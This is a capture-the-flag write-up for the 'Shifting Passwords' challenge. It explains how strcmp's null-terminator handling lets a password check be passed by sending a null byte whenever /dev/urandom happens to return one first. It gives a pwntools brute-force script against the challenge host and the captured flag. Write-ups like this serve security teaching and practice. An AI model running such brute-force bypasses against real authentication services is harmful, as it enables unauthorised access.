# Shifting Passwords
- 981 points

Description
---
Here it is, a secret APOCALYPSE data bank! We even found a binary that close resembles the password verification process.

The only problem is...the password's always changing, at least we think so.

Password cracking is hard, but what if the passwords are never the same...

Interact with the service using:

```nc chals.cyberthon22f.ctf.sg 10201```

Files: [shifting_passwords](./shifting_passwords)

Solution
---
This challenge makes use of bruteforcing `/dev/urandom` thanks to the null terminating string logic bug with strcmp.

The password cracking implies that there is some bruteforcing needed. 

Looking at the main function decompiled in IDA,

```c
  setvbuf(stdout, 0LL, 2, 0LL);
  puts("Welcome APOCALYPSE! Enter the password here: ");
  fgets(s, 128, stdin);
  s2 = (char *)generate_random_password();
  if ( !strcmp(s, s2) )
  {
    stream = fopen("flag.txt", "r");
    if ( !stream )
    {
      printf("Could not find flag.txt!");
      return 1;
    }
    fseek(stream, 0LL, 2);
    v6 = ftell(stream);
    fseek(stream, 0LL, 0);
    ptr = malloc(v6);
    fread(ptr, v6, 1uLL, stream);
    fclose(stream);
    printf("%s", (const char *)ptr);
  }
  else
  {
    puts("Wrong password!");
  }
  free(s2);
  return 0;
}
```

Despite the presence of `malloc()` and `free()`, this is not a heap challenge, and the heap is being correctly used.

Checking the `generate_random_password()` function,

```c
char *generate_random_password()
{
  char *s; // [rsp+0h] [rbp-10h]
  FILE *stream; // [rsp+8h] [rbp-8h]

  stream = fopen("/dev/urandom", "rb");
  s = (char *)malloc(0x80uLL);
  fgets(s, 128, stream);
  fclose(stream);
  return s;
}
```
A bit of googling shows that /dev/urandom is a special file used to generate random numbers.

A bit more googling for "/dev/urandom ctf" reveals that there is a small chance that /dev/urandom will return a first null byte. [https://ctftime.org/writeup/24905]

`strcmp()` makes use of null terminating strings to determine the end of a string. More explanation [here](https://github.com/absurdtiger/Sieberrsec-CTF-3.0/tree/main/Pwn/warmup).

So we can just bruteforce for the small chance a null byte is the first one in the string that returns from `/dev/urandom`.

```python
from pwn import *
context.log_level='debug'

for i in range(1000):
        p = connect("chals.cyberthon22f.ctf.sg",10201)
        p.sendlineafter("Welcome APOCALYPSE! Enter the password here:", b"\x00")
        print(p.recvall())
        p.close()
```
```
$ python3 exploit.py > a.log
$ cat a.log | grep Cyberthon
```
I cleaned up the script because I like wasting time
```python
from pwn import *
context.log_level='debug'

for i in range(1000):
        p = connect("chals.cyberthon22f.ctf.sg",10201)
        p.sendlineafter("Welcome APOCALYPSE! Enter the password here:", b"\x00")
        out = str(p.recvall())
        p.close()
        if out.find("Cyberthon") != -1:
                log.info(out)
                break
        else:
                continue
```

`Cyberthon{nu11_t3rm1n4t0r5}`

Remarks
---
- initially thought it was heap because malloc() and free() but it didn't mean anything and looked like it was properly used; I do wonder if it's possible to solve this challenge by exploiting the heap
